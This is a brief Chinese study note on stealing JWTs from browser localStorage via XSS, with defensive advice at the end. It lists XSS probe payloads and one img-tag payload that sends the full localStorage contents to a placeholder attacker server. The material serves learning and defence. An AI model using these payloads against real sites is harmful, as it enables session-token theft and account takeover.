

阅读下文有感： 
https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0 


jwt设置的位置：
cookies SET-COOKIE
JWT  AUTHORIZATION 

jwt存储位置：
localStorage/sessionStorage
后者在关闭浏览器之前存在

一般的cookie防护(httponly,secure,path,domain)  

几种XSS方式：
<script>alert(document.cookie)</script>
<script>alert(localStorage)</script>
<script>alert(localStorage.getItem(‘key’))</script>
<script>alert(localStorage.getItem(‘ServiceProvider.kdciaasdkfaeanfaegfpe23.username@company.com.accessToken’))</script>
<script>alert(JSON.stringify(localStorage))</script>
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>

一些防护方法： 
不要在localstorage中保存敏感信息  
Consider using the cookie header over the authorisation header.   							
Set your cookie header protections.  
Never render the token on screen, in URLs and/or in source code.  (不要在页面中(包括url)显示 token,无论是最终显示出来的页面还是源码中)
